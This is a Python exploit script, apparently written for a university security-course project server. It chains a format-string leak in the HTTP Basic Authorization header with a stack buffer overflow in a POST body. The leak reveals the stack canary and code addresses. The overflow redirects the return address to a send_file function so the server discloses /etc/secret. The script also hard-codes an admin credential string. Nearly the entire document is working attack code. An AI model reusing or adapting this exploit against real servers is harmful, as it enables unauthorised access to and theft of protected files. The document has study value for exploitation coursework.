

url = "http://project-2.csec.chatzi.org:8000"
pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"


from requests import Request, Session
import base64
import time
import requests


last = None		# this variable the adress of ebp and is used in order to find the address of the buffer 
semi_last = None	# this variable is used in order to find the address of the send_file function 
canery = None # this variable is used in order to store canary 
hellooo = None	# this variable is used in order to find the address of the original return address of post_param


def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
			print(int(b))
		else:
			mystring += '%c' % 0x26			# if b is \0, replace it with &
			print(0x26)
	return mystring


# find the value of the previously mentioned variables by using the formatted string attack
def set_variables():
	global last
	global semi_last
	global canery
	global hellooo

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	print(response.status_code)
	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	last = int(mystring[-1],16)
	semi_last = int(mystring[-2],16)
	canery = int(mystring[-4],16)
	hellooo = int(mystring[4],16)

set_variables()

# find the original values based on some stable offsets
guessed_address=last - 0xB8	
send_file = semi_last - 0x4f85 
var_c0_value = canery	
shutdown = hellooo - 0x1C7	# original return address of post_param


# variables used to perform addition of the wanted functions in the stack
old_ebp = last
old_esi = 0xF7F31000 # It's going to be  overridden, so its value doesn't matter
old_ebx = var_c0_value



print("send_file difference with semi_last")
print(hex(semi_last - send_file))


print(hex(guessed_address))


# /etc/secret& | !*80 | param_name | 8*! | name | c | 4*! | p_post_data | value | var_c0_value | old_ebx | old_esi | old_ebp |send_file | shutdown | guessed_address |'\0'| 
# param_name is pointer to null 
# name, c and value are going to be overridden, so we initialize them with thash
# p_post_data is pointer to null 
# old_esi is also initialized with trash
# this part of the stack " old_ebx | old_esi | old_ebp |send_file " προσομοιώνει την κληση μια συνάρτησης από την 
# When the post_param function finishes it will go back to the return address which is overwriten by the address of send_file. 
# As return of the send adress we store the original return address of post_param, so the execution of the program will be completed

shellcode = "/etc/secret&" 

data = shellcode 
data +=  80*"!" 
data += transform_address(guessed_address + 140 + 4)
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address + 8)
data += 4*"-" 
data +=  transform_address(var_c0_value)
data += transform_address(old_ebx) 
data += transform_address(old_esi) 
data += transform_address(old_ebp) 
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data += transform_address(guessed_address)
data += '\0'


s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = 66    # set the payload in something smaller in order to perform buffer overflow
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)


print(response.status_code)
print(response.headers)
print(response.content)

